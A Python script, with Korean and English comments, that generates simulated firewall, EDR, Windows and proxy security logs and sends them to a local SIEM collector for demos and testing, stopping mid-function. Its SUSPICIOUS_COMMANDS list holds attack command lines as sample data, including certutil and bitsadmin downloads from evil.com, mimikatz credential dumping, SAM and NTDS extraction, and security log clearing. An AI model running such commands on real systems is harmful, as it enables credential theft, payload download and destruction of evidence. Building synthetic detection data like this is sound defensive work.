#!/usr/bin/env python3
"""
SIEM Log Generator Script
=========================
Collector HTTP API로 시뮬레이션된 보안 로그를 전송하는 스크립트.

4개의 데모 자산에서 현실적인 로그를 생성합니다:
- Palo Alto PA-5260 (방화벽)
- CrowdStrike Falcon (EDR)
- Windows Server 2022 (보안 이벤트)
- Zscaler Cloud Proxy (웹 프록시)

사용법:
    python log_generator.py --rate 5 --duration 60 --scenario mixed --asset all

저자: SIEM-SOAR 플랫폼 팀
"""

import argparse
import json
import random
import sys
import time
from datetime import datetime, timezone
from typing import Any, Callable

import requests

# =============================================================================
# ANSI 컬러 코드 (ANSI Color Codes)
# =============================================================================

# Windows cmd/PowerShell과 Unix 터미널 모두에서 동작하도록
# sys.stdout.isatty() 여부와 무관하게 코드를 정의하고,
# 실제 출력 시점에 색상 지원 여부를 확인한다.
_ANSI_RESET  = "\033[0m"
_ANSI_CYAN   = "\033[96m"
_ANSI_YELLOW = "\033[93m"
_ANSI_GREEN  = "\033[92m"
_ANSI_GRAY   = "\033[90m"


def _supports_color() -> bool:
    """터미널이 ANSI 컬러를 지원하는지 확인"""
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()


def _colored(text: str, color_code: str) -> str:
    """컬러 지원 시 ANSI 코드 적용, 아니면 plain text 반환"""
    if _supports_color():
        return f"{color_code}{text}{_ANSI_RESET}"
    return text


def _dry_run_prefix() -> str:
    return _colored("[DRY-RUN]", _ANSI_CYAN)

# =============================================================================
# 상수 정의 (Constants)
# =============================================================================

# Collector API 엔드포인트
DEFAULT_COLLECTOR_URL = "http://localhost:8087/api/v1/logs"

# 자산 ID 매핑 (Asset ID Mapping)
ASSETS = {
    "paloalto": {
        "asset_id": "pa-5260-fw-01",
        "name": "Palo Alto PA-5260",
        "type": "firewall",
        "source_type": "firewall"
    },
    "crowdstrike": {
        "asset_id": "cs-falcon-sensor-01",
        "name": "CrowdStrike Falcon",
        "type": "edr",
        "source_type": "edr"
    },
    "windows": {
        "asset_id": "win-srv-2022-dc01",
        "name": "Windows Server 2022 DC",
        "type": "windows",
        "source_type": "windows"
    },
    "zscaler": {
        "asset_id": "zscaler-proxy-01",
        "name": "Zscaler Cloud Proxy",
        "type": "proxy",
        "source_type": "proxy"
    }
}

# =============================================================================
# 악성 지표 데이터 (Malicious Indicators)
# =============================================================================

# 알려진 TOR 출구 노드 및 악성 IP (Known TOR Exit Nodes & Malicious IPs)
MALICIOUS_IPS = [
    "185.220.101.1", "185.220.101.32", "185.220.101.45",
    "45.155.205.10", "45.155.205.100", "45.155.205.233",
    "198.96.155.3", "89.234.157.254", "91.250.242.12",
    "185.100.87.174", "185.220.102.8", "23.129.64.100"
]

# 의심스러운 명령어 패턴 (Suspicious Command Patterns)
SUSPICIOUS_COMMANDS = [
    "powershell -EncodedCommand SQBFAFgAIAAoA...",
    "powershell -ep bypass -nop -windowstyle hidden",
    "mimikatz.exe sekurlsa::logonpasswords",
    "mimikatz # privilege::debug",
    "net user Administrator /domain",
    "net group \"Domain Admins\" /domain",
    "wmic /node:@targets.txt process call create \"cmd.exe\"",
    "psexec.exe \\\\target -s cmd.exe",
    "certutil -urlcache -split -f http://evil.com/payload.exe",
    "bitsadmin /transfer malicious http://evil.com/mal.exe c:\\mal.exe",
    "reg save HKLM\\SAM sam.save",
    "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\"",
    "vssadmin create shadow /for=C:",
    "wevtutil cl Security",
    "schtasks /create /sc ONSTART /tn \"evil\" /tr \"malware.exe\""
]

# 악성 도메인 (Malicious Domains)
MALICIOUS_DOMAINS = [
    "evil-c2-server.ru", "malware-drop.cn", "phishing-bank.tk",
    "suspicious-download.xyz", "ransomware-payment.onion",
    "crypto-mining-pool.net", "exfiltration-server.cc"
]

# DLP 위반 패턴 (DLP Violation Patterns)
DLP_PATTERNS = [
    "SSN:XXX-XX-XXXX detected in upload",
    "Credit card number pattern found",
    "Healthcare HIPAA data detected",
    "PII: Korean RRN pattern detected",
    "Financial data export blocked",
    "Source code repository access blocked"
]

# 정상 내부 IP 대역 (Normal Internal IP Ranges)
INTERNAL_IPS = [
    "10.0.1.", "10.0.2.", "10.0.3.", "10.0.10.",
    "192.168.1.", "192.168.10.", "172.16.0."
]

# 정상 외부 서비스 IP (Normal External Service IPs)
NORMAL_EXTERNAL_IPS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "13.107.4.50", "52.114.128.8", "142.250.196.142"
]

# 정상 도메인 (Normal Domains)
NORMAL_DOMAINS = [
    "google.com", "microsoft.com", "github.com", "aws.amazon.com",
    "office365.com", "salesforce.com", "slack.com", "zoom.us"
]

# 사용자 계정 (User Accounts)
USERS = [
    "admin", "jkim", "mpark", "slee", "yhwang",
    "service_account", "backup_admin", "sql_service",
    "Administrator", "SYSTEM", "NT AUTHORITY\\SYSTEM"
]

# =============================================================================
# 로그 생성기 클래스 (Log Generators)
# =============================================================================

class LogGenerator:
    """로그 생성기 기본 클래스"""

    def __init__(self, scenario: str = "mixed"):
        # scenario: normal (정상), attack (공격), mixed (혼합)
        self.scenario = scenario
        # 공격 시나리오에서 악성 로그 비율 (Attack log ratio)
        self.attack_ratio = 0.3 if scenario == "mixed" else (1.0 if scenario == "attack" else 0.0)

    def _is_attack(self) -> bool:
        """현재 로그가 공격 시나리오인지 결정"""
        return random.random() < self.attack_ratio

    def _random_internal_ip(self) -> str:
        """랜덤 내부 IP 생성"""
        prefix = random.choice(INTERNAL_IPS)
        return f"{prefix}{random.randint(1, 254)}"

    def _random_external_ip(self, is_malicious: bool = False) -> str:
        """랜덤 외부 IP 생성"""
        if is_malicious:
            return random.choice(MALICIOUS_IPS)
        return random.choice(NORMAL_EXTERNAL_IPS)

    def _random_user(self) -> str:
        """랜덤 사용자 선택"""
        return random.choice(USERS)

    def _iso_timestamp(self) -> str:
        """현재 시간의 ISO8601 타임스탬프 생성"""
        return datetime.now(timezone.utc).isoformat()


class PaloAltoGenerator(LogGenerator):
    """
    Palo Alto PA-5260 방화벽 로그 생성기

    로그 유형:
    - TRAFFIC: 트래픽 허용/거부 로그
    - THREAT: 위협 탐지 로그 (malware, vulnerability, spyware)
    """

    ACTIONS = ["allow", "deny", "drop", "reset-both"]
    THREAT_TYPES = ["virus", "spyware", "vulnerability", "url-filtering", "wildfire"]
    ZONES = ["trust", "untrust", "dmz", "guest"]
    APPS = ["web-browsing", "ssl", "dns", "ssh", "ftp", "smtp", "http", "rdp"]

    def generate_traffic_log(self) -> dict:
        """트래픽 로그 생성"""
        is_attack = self._is_attack()

        src_ip = self._random_internal_ip()
        dst_ip = self._random_external_ip(is_malicious=is_attack)
        action = "deny" if is_attack else random.choice(self.ACTIONS)

        src_port = random.randint(1024, 65535)
        dst_port = random.choice([80, 443, 22, 23, 25, 53, 3389, 445, 8080])

        # PAN-OS syslog 형식의 raw 로그 (PAN-OS syslog format)
        raw_log = (
            f"<14>1 {self._iso_timestamp()} PA-5260 - - - "
            f"TRAFFIC,{int(time.time())},0x0,"
            f"{src_ip},{dst_ip},,,"
            f"{random.choice(self.APPS)},{self._random_user()},"
            f"{random.choice(self.ZONES)},{random.choice(self.ZONES)},"
            f"rule-{random.randint(1, 100)},{src_port},{dst_port},"
            f"{action},{random.randint(100, 50000)},{random.randint(1, 1000)},"
            f"0,{'tcp' if dst_port in [80, 443, 22] else 'udp'}"
        )

        severity = "high" if is_attack else random.choice(["low", "informational"])

        return {
            "timestamp": self._iso_timestamp(),
            "raw": raw_log,
            "metadata": {
                "asset_id": ASSETS["paloalto"]["asset_id"],
                "severity": severity,
                "log_type": "TRAFFIC",
                "action": action,
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port,
                "dst_port": dst_port
            }
        }

    def generate_threat_log(self) -> dict:
        """위협 탐지 로그 생성"""
        src_ip = self._random_internal_ip()
        dst_ip = self._random_external_ip(is_malicious=True)
        threat_type = random.choice(self.THREAT_TYPES)

        threat_names = {
            "virus": ["Emotet", "TrickBot", "Cobalt Strike Beacon", "Mimikatz"],
            "spyware": ["Keylogger.Generic", "RAT.RemoteAccess", "InfoStealer.Agent"],
            "vulnerability": ["CVE-2023-44487", "CVE-2024-21887", "CVE-2023-46747"],
            "url-filtering": ["Malware URL", "Phishing Site", "C2 Server"],
            "wildfire": ["Malicious Executable", "Suspicious PDF", "Ransomware Dropper"]
        }

        threat_name = random.choice(threat_names.get(threat_type, ["Unknown"]))

        raw_log = (
            f"<14>1 {self._iso_timestamp()} PA-5260 - - - "
            f"THREAT,{int(time.time())},0x8000,"
            f"{src_ip},{dst_ip},,,"
            f"{random.choice(self.APPS)},{self._random_user()},"
            f"{random.choice(self.ZONES)},{random.choice(self.ZONES)},"
            f"threat-rule-1,{threat_type},"
            f"\"{threat_name}\",alert,critical,"
            f"block,0,0x0"
        )

        return {
            "timestamp": self._iso_timestamp(),
            "raw": raw_log,
            "metadata": {
                "asset_id": ASSETS["paloalto"]["asset_id"],
                "severity": "critical",
                "log_type": "THREAT",
                "threat_type": threat_type,
                "threat_name": threat_name,
                "src_ip": src_ip,
                "dst_ip": dst_ip
            }
        }

    def generate(self) -> dict:
        """로그 생성 (TRAFFIC 또는 THREAT)"""
        if self._is_attack():
            return self.generate_threat_log()
        return self.generate_traffic_log()


class CrowdStrikeGenerator(LogGenerator):
    """
    CrowdStrike Falcon EDR 로그 생성기

    로그 유형:
    - ProcessRollup2: 프로세스 실행 이벤트
    - DetectionSummaryEvent: 위협 탐지 이벤트
    - UserLogonEvent: 사용자 로그온 이벤트
    """

    PROCESS_NAMES = ["cmd.exe", "powershell.exe", "python.exe", "chrome.exe",
                     "notepad.exe", "explorer.exe", "svchost.exe", "msiexec.exe"]

    SUSPICIOUS_PROCESSES = ["mimikatz.exe", "psexec.exe", "procdump.exe",
                           "lazagne.exe", "sharphound.exe", "rubeus.exe"]

    TACTICS = ["Initial Access", "Execution", "Persistence", "Privilege Escalation",
               "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement",
               "Collection", "Exfiltration", "Command and Control"]

    TECHNIQUES = ["T1059.001", "T1003.001", "T1078", "T1053.005", "T1055",
                  "T1021.002", "T1027", "T1070.004", "T1547.001", "T1071.001"]

    def generate_process_event(self) -> dict:
        """프로세스 실행 이벤트 생성"""
        is_attack = self._is_attack()

        if is_attack:
            process = random.choice(self.SUSPICIOUS_PROCESSES)
            cmd_line = random.choice(SUSPICIOUS_COMMANDS)
            severity = "critical"
        else:
            process = random.choice(self.PROCESS_NAMES)
            cmd_line = f"{process} /normal /flag"
            severity = "informational"

        hostname = f"WORKSTATION-{random.randint(1, 100):03d}"
        user = self._random_user()
        parent = random.choice(["explorer.exe", "services.exe", "cmd.exe"])

        event = {
            "event_type": "ProcessRollup2",
            "timestamp": self._iso_timestamp(),
            "aid": f"sensor-{random.randint(10000, 99999)}",
            "cid": "customer-12345",
            "hostname": hostname,
            "username": user,
            "process_name": process,
            "command_line": cmd_line,
            "parent_process_name": parent,
            "pid": random.randint(1000, 65535),
            "ppid": random.randint(100, 999),
            "sha256": f"{random.randbytes(32).hex()}"
        }

        return {
            "timestamp": self._iso_timestamp(),
            "raw": json.dumps(event),
            "metadata": {
                "asset_id": ASSETS["crowdstrike"]["asset_id"],
                "severity": severity,
                "event_type": "ProcessRollup2",
                "hostname": hostname,
                "process_name": process
            }
        }

    def generate_detection_event(self) -> dict:
        """위협 탐지 이벤트 생성"""
        hostname = f"WORKSTATION-{random.randint(1, 100):03d}"
        user = self._random_user()
        tactic = random.choice(self.TACTICS)
        technique = random.choice(self.TECHNIQUES)

        detection_names = [
            "Suspicious PowerShell Download", "Credential Dumping Attempt",
            "Lateral Movement Detected", "Ransomware Behavior Blocked",
            "Malicious Script Execution", "Process Injection Detected",
            "Privilege Escalation Attempt", "Persistence Mechanism Found"
        ]

        event = {
            "event_type": "DetectionSummaryEvent",
            "timestamp": self._iso_timestamp(),
            "aid": f"sensor-{random.randint(10000, 99999)}",
            "cid": "customer-12345",
            "hostname": hostname,
            "username": user,
            "detection_name": random.choice(detection_names),
            "severity": random.choice(["High", "Critical"]),
            "tactic": tactic,
            "technique": technique,
            "description": f"Suspicious activity detected: {tactic} using {technique}",
            "process_name": random.choice(self.SUSPICIOUS_PROCESSES),
            "command_line": random.choice(SUSPICIOUS_COMMANDS),
            "ioc_type": "process",
            "kill_chain_stage": random.choice(["weaponization", "delivery", "exploitation", "installation", "c2"])
        }

        return {
            "timestamp": self._iso_timestamp(),
            "raw": json.dumps(event),
            "metadata": {
                "asset_id": ASSETS["crowdstrike"]["asset_id"],
                "severity": "critical",
                "event_type": "DetectionSummaryEvent",
                "hostname": hostname,
                "detection_name": event["detection_name"],
                "tactic": tactic,
                "technique": technique
            }
        }

    def generate(self) -> dict:
        """로그 생성"""
        if self._is_attack():
            # 공격 시나리오: 탐지 이벤트 또는 의심 프로세스
            if random.random() < 0.5:
                return self.generate_detection_event()
        return self.generate_process_event()


class WindowsSecurityGenerator(LogGenerator):
    """
    Windows Server 2022 보안 이벤트 로그 생성기

    이벤트 유형:
    - 4624/4625: 로그온 성공/실패
    - 4672: 특수 권한 할당
    - 4688: 프로세스 생성
    - 4720: 사용자 계정 생성
    - 4732: 보안 그룹에 멤버 추가
    """

    EVENT_IDS = {
        4624: "An account was successfully logged on",
        4625: "An account failed to log on",
        4672: "Special privileges assigned to new logon",
        4688: "A new process has been created",
        4720: "A user account was created",
        4728: "A member was added to a security-enabled global group",
        4732: "A member was added to a security-enabled local group",
        4648: "A logon was attempted using explicit credentials",
        4776: "The domain controller attempted to validate credentials"
    }

    LOGON_TYPES = {
        2: "Interactive",
        3: "Network",
        4: "Batch",
        5: "Service",
        7: "Unlock",
        8: "NetworkCleartext",
        10: "RemoteInteractive",
        11: "CachedInteractive"
    }

    def generate_logon_event(self, success: bool = True) -> dict:
        """로그온 이벤트 생성"""
        event_id = 4624 if success else 4625
        user = self._random_user()
        src_ip = self._random_external_ip(is_malicious=not success)
        logon_type = random.choice(list(self.LOGON_TYPES.keys()))

        # Windows XML 이벤트 로그 형식 (Windows XML Event Log format)
        raw_log = (
            f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            f'<System><EventID>{event_id}</EventID>'
            f'<TimeCreated SystemTime="{self._iso_timestamp()}"/>'
            f'<Computer>WIN-SRV-DC01</Computer></System>'
            f'<EventData><Data Name="TargetUserName">{user}</Data>'
            f'<Data Name="TargetDomainName">CORP</Data>'
            f'<Data Name="LogonType">{logon_type}</Data>'
            f'<Data Name="IpAddress">{src_ip}</Data>'
            f'<Data Name="IpPort">{random.randint(1024, 65535)}</Data>'
            f'<Data Name="WorkstationName">WORKSTATION-{random.randint(1,100):03d}</Data>'
            f'</EventData></Event>'
        )

        severity = "low" if success else "high"

        return {
            "timestamp": self._iso_timestamp(),
            "raw": raw_log,
            "metadata": {
                "asset_id": ASSETS["windows"]["asset_id"],
                "severity": severity,
                "event_id": event_id,
                "event_description": self.EVENT_IDS[event_id],
                "username": user,
                "logon_type": self.LOGON_TYPES[logon_type],
                "source_ip": src_ip
            }
        }

    def generate_privilege_escalation(self) -> dict:
        """특수 권한 할당 이벤트 생성 (권한 상승 탐지)"""
        user = self._random_user()

        privileges = [
            "SeDebugPrivilege", "SeTcbPrivilege", "SeBackupPrivilege",
            "SeRestorePrivilege", "SeImpersonatePrivilege", "SeTakeOwnershipPrivilege"
        ]

        raw_log = (
            f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            f'<System><EventID>4672</EventID>'
            f'<TimeCreated SystemTime="{self._iso_timestamp()}"/>'
            f'<Computer>WIN-SRV-DC01</Computer></System>'
            f'<EventData><Data Name="SubjectUserName">{user}</Data>'
            f'<Data Name="SubjectDomainName">CORP</Data>'
            f'<Data Name="PrivilegeList">{random.choice(privileges)}</Data>'
            f'</EventData></Event>'
        )

        return {
            "timestamp": self._iso_timestamp(),
            "raw": raw_log,
            "metadata": {
                "asset_id": ASSETS["windows"]["asset_id"],
                "severity": "high",
                "event_id": 4672,
                "event_description": self.EVENT_IDS[4672],
                "username": user
            }
        }

    def generate_process_creation(self) -> dict:
        """프로세스 생성 이벤트 (의심 명령어 포함)"""
        is_attack = self._is_attack()
        user = self._random_user()

        if is_attack:
            cmd_line = random.choice(SUSPICIOUS_COMMANDS)
            severity = "critical"
        else:
            cmd_line = f"C:\\Windows\\System32\\svchost.exe -k netsvcs -p"
            severity = "informational"

        raw_log = (
            f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            f'<System><EventID>4688</EventID>'
            f'<TimeCreated SystemTime="{self._iso_timestamp()}"/>'
            f'<Computer>WIN-SRV-DC01</Computer></System>'
            f'<EventData><Data Name="SubjectUserName">{user}</Data>'
            f'<Data Name="NewProcessName">{cmd_line.split()[0] if " " in cmd_line else cmd_line}</Data>'
            f'<Data Name="CommandLine">{cmd_line}</Data>'
            f'<Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>'
            f'</EventData></Event>'
        )

        return {
            "timestamp": self._iso_timestamp(),
            "raw": raw_log,
            "metadata": {
                "asset_id": ASSETS["windows"]["asset_id"],
                "severity": severity,
                "event_id": 4688,
                "event_description": self.EVENT_IDS[4688],
                "username": user,
                "command_line": cmd_line
            }
        }

    def generate_brute_force_sequence(self) -> list[dict]:
        """무차별 대입 공격 시퀀스 생성"""
        events = []
        user = random.choice(["admin", "Administrator", "root"])
        src_ip = self._random_external_ip(is_malicious=True)

        # 여러 번의 로그인 실패 (Multiple failed logins)
        for _ in range(random.randint(5, 15)):
            event = {
                "timestamp": self._iso_timestamp(),
                "raw": (
                    f'<Event><System><EventID>4625</EventID>'
                    f'<TimeCreated SystemTime="{self._iso_timestamp()}"/>'
                    f'<Computer>WIN-SRV-DC01</Computer></System>'
                    f'<EventData><Data Name="TargetUserName">{user}</Data>'
                    f'<Data Name="IpAddress">{src_ip}</Data>'
                    f'<Data Name="FailureReason">%%2313</Data>'
                    f'</EventData></Event>'
                ),
                "metadata": {
                    "asset_id": ASSETS["windows"]["asset_id"],
                    "severity": "high",
                    "event_id": 4625,
                    "event_description": "Brute force attack detected",
                    "username": user,
                    "source_ip": src_ip
                }
            }
            events.append(event)
            time.sleep(0.1)  # 약간의 지연 (Slight delay)

        return events

    def generate(self) -> dict:
        """로그 생성"""
        is_attack = self._is_attack()

        if is_attack:
            event_type = random.choice(["failed_logon", "privilege", "process"])
            if event_type == "failed_logon":
                return self.generate_logon_event(success=False)
            elif event_type == "privilege":
                return self.generate_privilege_escalation()
            else:
                return self.generate_process_creation()
        else:
            return self.generate_logon_event(success=True)


class ZscalerGenerator(LogGenerator):
    """
    Zscaler Cloud Proxy 로그 생성기

    로그 유형:
    - Web: 웹 트래픽 로그
    - DLP: 데이터 손실 방지 이벤트
    - Malware: 악성코드 탐지
    """

    ACTIONS = ["allowed", "blocked", "cautioned", "bypassed"]
    CATEGORIES = ["Business", "Social Networking", "Streaming Media", "Shopping",
                  "Malware", "Phishing", "Adult", "Gambling", "Hacking"]

    def generate_web_log(self) -> dict:
        """웹 트래픽 로그 생성"""
        is_attack = self._is_attack()

        user = self._random_user()
        src_ip = self._random_internal_ip()

        if is_attack:
            domain = random.choice(MALICIOUS_DOMAINS)
            action = "blocked"
            category = random.choice(["Malware", "Phishing", "Hacking"])
            severity = "high"
        else:
            domain = random.choice(NORMAL_DOMAINS)
            action = "allowed"
            category = random.choice(["Business", "Social Networking", "Shopping"])
            severity = "informational"

        url = f"https://{domain}/{random.choice(['login', 'download', 'api', 'data'])}"

        # Zscaler NSS 로그 형식 (Zscaler NSS log format)
        raw_log = (
            f'{self._iso_timestamp()} zscaler NSS: '
            f'datetime={self._iso_timestamp()} '
            f'user={user}@corp.local '
            f'srcip={src_ip} '
            f'url={url} '
            f'action={action} '
            f'urlcategory={category} '
            f'department=Engineering '
            f'location=Seoul-Office '
            f'requestsize={random.randint(100, 10000)} '
            f'responsesize={random.randint(100, 50000)} '
            f'threatname={random.choice(["None", "Trojan.Gen", "Phish.URL"])} '
            f'dlpeng={random.choice(["None", "DLP-Rule-1"])}'
        )

        return {
            "timestamp": self._iso_timestamp(),
            "raw": raw_log,
            "metadata": {
                "asset_id": ASSETS["zscaler"]["asset_id"],
                "severity": severity,
                "log_type": "web",
                "action": action,
                "url": url,
                "category": category,
                "username": user
            }
        }

    def generate_dlp_event(self) -> dict:
        """DLP 위반 이벤트 생성"""
        user = self._random_user()
        src_ip = self._random_internal_ip()
        dlp_pattern = random.choice(DLP_PATTERNS)

        raw_log = (
            f'{self._iso_timestamp()} zscaler DLP: '
            f'datetime={self._iso_timestamp()} '
            f'user={user}@corp.local '
            f'srcip={src_ip} '
            f'action=blocked '
            f'dlpengine=Content-Inspection '
            f'dlprulename=Sensitive-Data-Policy '
            f'dlpdictionary=PII-Detection '
            f'dlpdetail="{dlp_pattern}" '
            f'filesize={random.randint(1000, 10000000)} '
            f'filename=confidential-{random.randint(1, 100)}.xlsx'
        )

        return {
            "timestamp": self._iso_timestamp(),
            "raw": raw_log,
            "metadata": {
                "asset_id": ASSETS["zscaler"]["asset_id"],
                "severity": "critical",
                "log_type": "dlp",
                "action": "blocked",
                "dlp_pattern": dlp_pattern,
                "username": user
            }
        }

    def generate_malware_event(self) -> dict:
        """악성코드 탐지 이벤트 생성"""
        user = self._random_user()
        src_ip = self._random_internal_ip()
        domain = random.choice(MALICIOUS_DOMAINS)

        malware_names = [
            "W32/Emotet.AV", "JS/Downloader.Gen", "Trojan.Agent.ZZ",
            "Ransomware.Ryuk", "Backdoor.Cobalt", "Spyware.FormBook"
        ]

        raw_log = (
            f'{self._iso_timestamp()} zscaler MALWARE: '
            f'datetime={self._iso_timestamp()} '
            f'user={user}@corp.local '
            f'srcip={src_ip} '
            f'url=https://{domain}/payload.exe '
            f'action=blocked '
            f'threatname={random.choice(malware_names)} '
            f'threatclass=Malware '
            f'md5={random.randbytes(16).hex()} '
            f'sha256={random.randbytes(32).hex()}'
        )

        return {
            "timestamp": self._iso_timestamp(),
            "raw": raw_log,
            "metadata": {
                "asset_id": ASSETS["zscaler"]["asset_id"],
                "severity": "critical",
                "log_type": "malware",
                "action": "blocked",
                "domain": domain,
                "username": user
            }
        }

    def generate(self) -> dict:
        """로그 생성"""
        if self._is_attack():
            event_type = random.choice(["dlp", "malware"])
            if event_type == "dlp":
                return self.generate_dlp_event()
            else:
                return self.generate_malware_event()
        return self.generate_web_log()


# =============================================================================
# HTTP 전송 클래스 (HTTP Sender)
# =============================================================================

class LogSender:
    """로그를 Collector API로 전송하는 클래스"""

    def __init__(self, url: str, tenant_id: str = "default"):
        self.url = url
        self.tenant_id = tenant_id
        self.session = requests.Session()
        self.session.headers.update({
            "Content-Type": "application/json",
            "Accept": "application/json"
        })

        # 통계 (Statistics)
        self.sent_count = 0
        self.error_count = 0
        self.total_bytes = 0

    def send(self, source_type: str, logs: list[dict]) -> bool:
        """
        로그 배치를 Collector로 전송

        Args:
            source_type: 로그 소스 유형 (firewall, edr, windows, proxy)
            logs: 로그 목록

        Returns:
            성공 여부
        """
        payload = {
            "tenant_id": self.tenant_id,
            "source_type": source_type,
            "logs": logs
        }

        try:
            response = self.session.post(
                self.url,
                json=payload,
                timeout=10
            )

            if response.status_code in [200, 202]:
                self.sent_count += len(logs)
                self.total_bytes += len(json.dumps(payload))
                return True
            else:
                self.error_count += 1
                print(f"[ERROR] HTTP {response.status_code}: {response.text}")
                return False

        except requests.exceptions.RequestException as e:
            self.error_count += 1
            print(f"[ERROR] Request failed: {e}")
            return False

    def get_stats(self) -> dict:
        """전송 통계 반환"""
        return {
            "sent_count": self.sent_count,
            "error_count": self.error_count,
            "total_bytes": self.total_bytes,
            "success_rate": (
                self.sent_count / (self.sent_count + self.error_count) * 100
                if (self.sent_count + self.error_count) > 0 else 0
            )
        }


# =============================================================================
# 드라이 런 프린터 (Dry-Run Printer)
# =============================================================================

class DryRunPrinter:
    """
    --dry-run 모드: HTTP 전송 없이 로그를 stdout에 출력하는 클래스.
    LogSender와 동일한 public 인터페이스를 제공하여 Runner가 투명하게 사용할 수 있다.
    """

    def __init__(self, verbose: bool = False):
        self.verbose = verbose

        # LogSender와 동일한 통계 필드
        self.sent_count = 0
        self.error_count = 0
        self.total_bytes = 0  # dry-run에서는 항상 0

    def send(self, source_type: str, logs: list[dict]) -> bool:
        """
        로그 배치를 stdout에 pretty-print.

        Args:
            source_type: 로그 소스 유형 (firewall, edr, windows, proxy)
            logs: 로그 목록

        Returns:
            항상 True (dry-run은 실패하지 않음)
        """
        prefix = _dry_run_prefix()

        for log in logs:
            header = (
                f"{prefix} "
                f"{_colored('source_type=' + source_type, _ANSI_YELLOW)} | "
                f"{_colored('severity=' + log.get('metadata', {}).get('severity', 'unknown'), _ANSI_GREEN)}"
            )
            print(header)

            if self.verbose:
                # verbose: metadata 필드를 별도로 한 줄씩 출력
                metadata = log.get("metadata", {})
                for key, value in metadata.items():
                    print(f"  {_colored(key, _ANSI_GRAY)}: {value}")

                # raw 로그 (줄바꿈 방지를 위해 별도 처리)
                raw = log.get("raw", "")
                if raw:
                    print(f"  {_colored('raw', _ANSI_GRAY)}: {raw[:200]}{'...' if len(raw) > 200 else ''}")
                print()

            # 항상 pretty-printed JSON 출력
            print(json.dumps(log, indent=2, ensure_ascii=False))
            print()

            self.sent_count += 1

        return True

    def get_stats(self) -> dict:
        """통계 반환 (LogSender 인터페이스 호환)"""
        total = self.sent_count + self.error_count
        return {
            "sent_count": self.sent_count,
            "error_count": self.error_count,
            "total_bytes": self.total_bytes,
            "success_rate": (self.sent_count / total * 100) if total > 0 else 100.0
        }


# =============================================================================
# 메인 실행 함수 (Main Runner)
# =============================================================================

class LogGeneratorRunner:
    """로그 생성기 실행 관리자"""

    def __init__(
        self,
        collector_url: str,
        rate: int,
        duration: int,
        scenario: str,
        assets: list[str],
        dry_run: bool = False,
        verbose: bool = False
    ):
        self.collector_url = collector_url
        self.rate = rate
        self.duration = duration
        self.scenario = scenario
        self.assets = assets
        self.dry_run = dry_run
        self.verbose = verbose

        # 생성기 초기화 (Initialize generators)
        self.generators: dict[str, LogGenerator] = {}

        generator_map = {
            "paloalto": PaloAltoGenerator,
            "crowdstrike": CrowdStrikeGenerator,
            "windows": WindowsSecurityGenerator,
            "zscaler": ZscalerGenerator
        }

        for asset in assets:
            if asset in generator_map:
                self.generators[asset] = generator_map[asset](scenario)

        # dry-run 모드에서는 HTTP 전송 대신 stdout 출력
        if dry_run:
            self.sender: LogSender | DryRunPrinter = DryRunPrinter(verbose=verbose)
        else:
            self.sender = LogSender(collector_url)

    def run(self) -> None:
        """로그 생성 및 전송 실행"""
        print("=" * 60)
        print("SIEM Log Generator")
        print("=" * 60)
        if self.dry_run:
            print(_colored("  MODE: DRY-RUN (no HTTP requests will be sent)", _ANSI_CYAN))
        print(f"Collector URL: {self.collector_url}")
        print(f"Rate: {self.rate} logs/second")
        print(f"Duration: {self.duration} seconds")
        print(f"Scenario: {self.scenario}")
        print(f"Assets: {', '.join(self.assets)}")
        if self.verbose:
            print(_colored("  Verbose: ON", _ANSI_YELLOW))
        print("=" * 60)
        print()

        if self.dry_run:
            # dry-run 모드: 연결 테스트 건너뜀 (Skip connection test)
            print(f"{_dry_run_prefix()} Skipping collector health check (dry-run mode)")
            print(f"{_dry_run_prefix()} Logs will be printed to stdout as formatted JSON")
            print()
        else:
            # 초기 연결 테스트 (Initial connection test)
            print("[INFO] Testing connection to collector...")
            try:
                response = requests.get(
                    self.collector_url.replace("/api/v1/logs", "/health"),
                    timeout=5
                )
                if response.status_code == 200:
                    print("[OK] Collector is healthy")
                else:
                    print(f"[WARN] Health check returned {response.status_code}")
            except Exception as e:
                print(f"[WARN] Could not reach health endpoint: {e}")
                print("[INFO] Continuing anyway...")
            print()

        print("[INFO] Starting log generation...")
        print()

        start_time = time.time()
        interval = 1.0 / self.rate
        log_count = 0
        batch_size = min(10, self.rate)  # 배치 크기 제한

        try:
            while (time.time() - start_time) < self.duration:
                batch: dict[str, list] = {}

                # 배치 생성 (Generate batch)
                for _ in range(batch_size):
                    asset = random.choice(list(self.generators.keys()))
                    generator = self.generators[asset]
                    log = generator.generate()

                    source_type = ASSETS[asset]["source_type"]
                    if source_type not in batch:
                        batch[source_type] = []
                    batch[source_type].append(log)
                    log_count += 1

                # 각 소스 타입별로 전송 (Send per source type)
                for source_type, logs in batch.items():
                    self.sender.send(source_type, logs)

                # 진행 상황 출력 (Print progress)
                elapsed = time.time() - start_time
                actual_rate = log_count / elapsed if elapsed > 0 else 0
                print(
                    f"\r[PROGRESS] Elapsed: {elapsed:.1f}s | "
                    f"Logs: {log_count} | "
                    f"Rate: {actual_rate:.1f}/s | "
                    f"Errors: {self.sender.error_count}",
                    end=""
                )

                # 속도 조절 (Rate limiting)
                time.sleep(interval * batch_size)

        except KeyboardInterrupt:
            print("\n\n[INFO] Interrupted by user")

        # 최종 통계 출력 (Print final statistics)
        self._print_stats(time.time() - start_time, log_count)

    def _print_stats(self, total_time: float, total_logs: int) -> None:
        """최종 통계 출력"""
        stats = self.sender.get_stats()

        print("\n")
        print("=" * 60)
        if self.dry_run:
            print(_colored("Final Statistics  [DRY-RUN]", _ANSI_CYAN))
        else:
            print("Final Statistics")
        print("=" * 60)
        print(f"Total Duration: {total_time:.2f} seconds")
        print(f"Total Logs Generated: {total_logs}")
        if self.dry_run:
            print(f"Total Logs Printed: {stats['sent_count']}")
        else:
            print(f"Total Logs Sent: {stats['sent_count']}")
        print(f"Total Errors: {stats['error_count']}")
        print(f"Success Rate: {stats['success_rate']:.2f}%")
        print(f"Average Rate: {total_logs / total_time:.2f} logs/second")
        if not self.dry_run:
